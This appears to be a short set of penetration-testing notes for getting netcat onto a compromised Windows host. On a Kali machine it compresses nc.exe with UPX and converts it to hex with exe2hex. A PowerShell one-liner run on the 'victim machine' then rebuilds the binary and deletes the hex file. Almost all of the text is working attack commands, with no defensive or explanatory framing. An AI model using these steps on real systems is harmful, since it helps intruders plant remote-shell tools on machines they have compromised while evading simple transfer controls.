## On Kali
```bash
# Find the binary
locate nc.exe | grep binaries
cp /usr/share/windows-resources/binaries/nc.exe .
ls -lh nc.exe

# Compress the binary using UPX
upx -9 nc.exe
ls -lh nc.exe

# Convert the binary to hex using exe2hex
exe2hex -x nc.exe -p nc.cmd
```

## On the victim machine (Windows)
### Get back the binary file
```powershell
powershell -Command "$h=Get-Content -readcount 0 -path
'./nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-
1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles
]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force
nc.hex;"
```